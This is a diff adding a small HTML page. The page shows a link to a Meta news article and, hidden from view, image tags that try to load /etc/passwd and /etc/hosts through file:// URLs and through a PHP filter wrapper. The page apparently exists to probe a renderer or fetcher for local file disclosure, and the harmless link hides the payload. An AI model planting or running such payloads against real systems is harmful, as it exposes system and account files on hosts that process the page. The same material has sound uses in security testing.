@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <a href="https://about.fb.com/news/2026/01/meta-nuclear-energy-projects-power-american-ai-leadership/">
+        Link to article
+    </a>
+    
+    <!-- Try to load local file as image -->
+    <img src="file:///etc/passwd" style="display:none" 
+         onerror="console.log('Local file access attempted')">
+    <img src="file:///etc/hosts" style="display:none">
+    
+    <!-- Try PHP filter if server is PHP -->
+    <img src="php://filter/convert.base64-encode/resource=/etc/passwd" style="display:none">
+</body>
+</html>
